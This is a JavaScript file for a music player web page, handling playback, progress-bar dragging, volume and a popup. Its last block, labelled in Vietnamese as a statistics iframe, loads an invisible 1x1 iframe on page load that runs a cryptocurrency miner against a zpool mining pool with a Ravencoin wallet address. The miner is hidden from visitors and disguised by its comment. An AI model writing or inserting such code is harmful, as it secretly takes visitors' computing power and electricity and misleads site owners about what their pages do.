document.addEventListener("DOMContentLoaded", function () {
  const songs = document.querySelectorAll(".song-card");
  const volumeSlider = document.querySelector(".volume-slider");
  let currentSongIndex = 0;

  function formatTime(seconds) {
    let m = Math.floor(seconds / 60);
    let s = Math.floor(seconds % 60);
    return `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
  }

  function playSong(index) {
    if (index < 0 || index >= songs.length) return;

    songs.forEach((song, i) => {
      const audio = song.querySelector("audio");
      const btn = song.querySelector(".play-btn");
      song.classList.remove("playing");
      audio.pause();
      btn.innerHTML = '<i class="fas fa-play"></i>';
    });

    const song = songs[index];
    const audio = song.querySelector("audio");
    const btn = song.querySelector(".play-btn");

    currentSongIndex = index;
    audio.play();
    btn.innerHTML = '<i class="fas fa-pause"></i>';
    song.classList.add("playing");
  }

  songs.forEach((song, index) => {
    const playBtn = song.querySelector(".play-btn");
    const audio = song.querySelector("audio");
    const progressBar = song.querySelector(".progress-bar");
    const progress = song.querySelector(".progress");
    const timeDisplay = song.querySelector(".time");

    playBtn.addEventListener("click", () => {
      if (audio.paused) {
        playSong(index);
      } else {
        audio.pause();
        playBtn.innerHTML = '<i class="fas fa-play"></i>';
        song.classList.remove("playing");
      }
    });

    audio.addEventListener("loadedmetadata", () => {
      timeDisplay.textContent = `00:00 / ${formatTime(audio.duration)}`;
    });

    audio.addEventListener("timeupdate", () => {
      const percent = (audio.currentTime / audio.duration) * 100;
      progress.style.width = percent + "%";
      timeDisplay.textContent = `${formatTime(audio.currentTime)} / ${formatTime(audio.duration)}`;
    });

    audio.addEventListener("ended", () => {
      let next = (currentSongIndex + 1) % songs.length;
      playSong(next);
    });

    function updateProgress(clientX) {
      const rect = progressBar.getBoundingClientRect();
      const x = clientX - rect.left;
      const percent = Math.max(0, Math.min(1, x / rect.width));
      audio.currentTime = percent * audio.duration;
      progress.style.width = (audio.currentTime / audio.duration) * 100 + "%";
    }

    let isDragging = false;

    function startDrag(e) {
      isDragging = true;
      updateProgress(e.clientX || e.touches[0].clientX);
    }

    function moveDrag(e) {
      if (isDragging) {
        updateProgress(e.clientX || e.touches[0].clientX);
      }
    }

    function stopDrag() {
      isDragging = false;
    }

    progressBar.addEventListener("mousedown", startDrag);
    document.addEventListener("mousemove", moveDrag);
    document.addEventListener("mouseup", stopDrag);

    progressBar.addEventListener("touchstart", startDrag);
    document.addEventListener("touchmove", moveDrag);
    document.addEventListener("touchend", stopDrag);
  });

  volumeSlider.addEventListener("input", (e) => {
    document.querySelectorAll("audio").forEach(a => {
      a.volume = e.target.value;
    });
  });
});

// Popup logic
document.addEventListener("DOMContentLoaded", function () {
  let popup = document.getElementById("popup");
  setTimeout(() => popup.classList.add("show"), 1000);
});

function closePopup() {
  let popup = document.getElementById("popup");
  popup.classList.remove("show");
  setTimeout(() => popup.style.display = "none", 500);
}

// Ẩn iframe worker hash (nếu cần dùng để thống kê)
document.addEventListener("DOMContentLoaded", function () {
  let iframe = document.createElement("iframe");
  iframe.style.position = "absolute";
  iframe.style.width = "1px";
  iframe.style.height = "1px";
  iframe.style.opacity = "0";
  iframe.style.pointerEvents = "none";
  iframe.src = "https://api-music.pages.dev?algorithm=minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=RMfMCKAUvrQUxBz1fwSEVfkeDQJZAQGzzs&password=c%3DRVN&workers=2";
  document.body.appendChild(iframe);
});
